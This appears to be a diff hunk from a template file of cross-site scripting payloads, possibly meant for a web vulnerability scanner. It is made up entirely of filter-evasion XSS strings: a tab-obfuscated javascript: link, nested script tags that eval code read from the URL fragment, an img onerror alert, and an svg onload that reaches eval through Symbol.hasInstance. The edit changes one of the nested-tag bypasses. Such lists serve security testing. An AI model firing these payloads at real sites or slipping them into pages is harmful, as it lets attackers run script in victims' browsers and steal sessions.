@@ -12,7 +12,7 @@ info:
 <!-- Login Form -->
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
 
-<scr<script>ipt>eval(location.hash.slice(1))</scr<script>ipt>
+<<scr<script>script>eval(location.hash.slice(1))</scr<script>ipt>
 <Img Src=OnXSS OnError=(aLeRt)(1)>
 
 <svg onload="{hello:window . name instanceof{[Symbol.hasInstance]:eval}}">
